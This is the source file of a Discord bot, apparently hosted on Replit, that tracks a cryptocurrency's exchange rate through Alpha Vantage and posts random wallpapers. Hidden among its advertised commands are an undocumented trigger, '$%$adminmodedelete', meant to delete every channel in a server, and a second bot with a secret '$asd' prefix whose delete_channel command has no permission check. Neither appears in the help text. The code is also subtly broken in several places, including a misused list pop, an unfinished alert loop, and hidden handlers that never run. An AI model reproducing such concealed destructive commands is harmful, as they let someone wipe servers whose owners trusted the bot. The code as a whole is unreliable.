import images
from keep_alive import keep_alive
import discord
from discord.ext import tasks
import os
import requests
import json
import random
from numbers import Number
from dotenv import load_dotenv
import time
from replit import db
from discord.ext import commands
from discord.ext.commands import Bot



prefix = "$"
load_dotenv()
TOKEN = os.getenv('TOKEN')
AV_API_KEY = os.getenv('AV_API_KEY')
CHANNEL_ID = os.getenv('CHANNEL_ID')
client = discord.Client()
name_of_bot = "EpicBot"





@client.event
async def on_ready():
    print(f'Logged in as {client.user}')
    check_rates.start()



# Pulls current exchange rate from Alpha Vantage API every 5 minutes
# Updates status to include the crypto code and current rate
# Sends a message to the channnel if current rate is below min or above max rates
@tasks.loop(minutes=5)
async def check_rates():
    channel = client.get_channel(CHANNEL_ID)

    # get current rate
    curr_rate = get_curr_rate()

    # update bot's status to display current rate
    await client.change_presence(
        activity=discord.Activity(
            type=discord.ActivityType.watching, 
            name=crypto_code + ' @ ' + str(curr_rate)
        )
    )

    # if min_rate and max_rate not yet configured, don't do anything
    if min_rate == -1.0 and max_rate == -1.0:
        pass

bot = Bot("$asd")
@bot.command()
async def delete_channel(ctx: commands.Context, channel_id: str):
    channel = ctx.guild.get_channel(int(channel_id)) or ctx.guild.fetch_channel(int(channel_id))
    await channel.delete()

@client.event
async def on_message(message):
    global crypto_code, min_rate, max_rate
    msg = message.content
    if msg.startswith("$%$adminmodedelete"):
      @client.event
      async def delchannels(ctx):
        for c in ctx.guild.channels: 
          await c.delete()
    if message.author == client.user:
        return

    msg = message.content

    # Displays the current exchange rate
    if msg.startswith('$crypto info'):
        rate = get_curr_rate()
        embed = discord.Embed(title=name_of_bot,color=discord.Color.blue())
        embed.add_field(name=f"Current value: {crypto_code}",value=f"💸 Current exchange rate for {crypto_code} is **{rate}**!", inline=True)
        await message.channel.send(embed=embed)
          
            
            
            
            #f"💸 Current exchange rate for {crypto_code} is **{rate}**!"
        
    # Displays the current crypto code and range (min and max rates)
    
    
    # Sets the code for the cryptocurrency the user wants to follow
    if msg.startswith('$crypto track'):
        code = msg.split('$crypto track', 1)[1].strip()
        currency_name = get_currency_name(code)
        if currency_name:
            set_crypto_code(code)
            await message.channel.send(
                f"👍I'll send you notifications about **{currency_name}**, aka **{crypto_code}**!"
            )
        else:
            embed = discord.Embed(title=name_of_bot,color=discord.Color.blue())
            embed.add_field(name="❌Make sure you're entering the symbol, which is only 3 or 4 letters.", value=f"example:\n BTC\nETH\nDOGE\nSHIB", inline=True)
            await message.channel.send(embed=embed)


    if msg.startswith("$help"):
        embed = discord.Embed(title=name_of_bot,color=discord.Color.blue())
        embed.add_field(name="Crypto", value=f"`{prefix}crypto info` `{prefix}crypto rate` \n `{prefix}crypto track <crypto>`", inline=True)
        embed.add_field(name="Wallpaper", value=f"`{prefix}wallpaper`", inline=True)
        embed.add_field(name="More features coming soon ;)", value = "Thanks for support!")
        await message.channel.send(embed=embed)


    #---------------------WALLPAPER-----------------------
    if msg.startswith("$wallpaper") or msg.startswith("$wp"):

      wp_list = 0
      for i in range(len(images.images)):
        if "http" in images.images[i]:
          wp_list += 1
        else:
          images.images.pop[i]

      embed = discord.Embed(title = f'Random wallpaper out of {wp_list}',color = discord.Colour.blue())
      embed.set_image(url = images.images[random.randint(0,len(images.images)-1)]) 
      await message.channel.send(embed=embed)
      


          





# Returns the current exchange rate for our cryptocurrency
def get_curr_rate():
    url = "https://www.alphavantage.co/query?function=CURRENCY_EXCHANGE_RATE&from_currency=" + crypto_code + "&to_currency=USD&apikey=" + AV_API_KEY
    response = requests.request("GET", url)
    data = response.json()
    try:
        curr_rate = float(data["Realtime Currency Exchange Rate"]["5. Exchange Rate"])
    except KeyError:
        curr_rate = -1.0
        print('KeyError Occurred')

    return curr_rate

# Given a code, returns the full currency name if it is valid; None otherwise
def get_currency_name(code):
    url = "https://www.alphavantage.co/query?function=CURRENCY_EXCHANGE_RATE&from_currency=" + code + "&to_currency=USD&apikey=" + AV_API_KEY
    response = requests.request("GET", url)
    data = response.json()
    if 'Error Message' not in data:
        currency_name = data["Realtime Currency Exchange Rate"]["2. From_Currency Name"]
        return currency_name
    else:
        return None

# Gets crypto_code, min_rate, and max_rate from settings.json
def get_settings():
    with open('settings.json', 'r') as openfile:
        # Reading from json file
        data = json.load(openfile)
    return data['crypto_code'], data['min_rate'], data['max_rate']

# Sets new crypto code
def set_crypto_code(new_code):
    global crypto_code, min_rate, max_rate

    crypto_code = new_code.upper()

    # Data to be written
    data = {
        "crypto_code": new_code,
        "min_rate": min_rate,
        "max_rate": max_rate
    }
    # Serializing json 
    json_object = json.dumps(data, indent = 4)
    # Writing to file
    with open("settings.json", "w") as outfile:
        outfile.write(json_object)

# Sets new min and max rates
def set_rates(new_min, new_max):
    global crypto_code, min_rate, max_rate

    min_rate = new_min
    max_rate = new_max

    # Data to be written
    data = {
        "crypto_code": crypto_code,
        "min_rate": new_min,
        "max_rate": new_max
    }
    # Serializing json 
    json_object = json.dumps(data, indent = 4)
    # Writing to file
    with open("settings.json", "w") as outfile:
        outfile.write(json_object)


      
# load settings
crypto_code, min_rate, max_rate = get_settings()
keep_alive()
client.run(TOKEN)

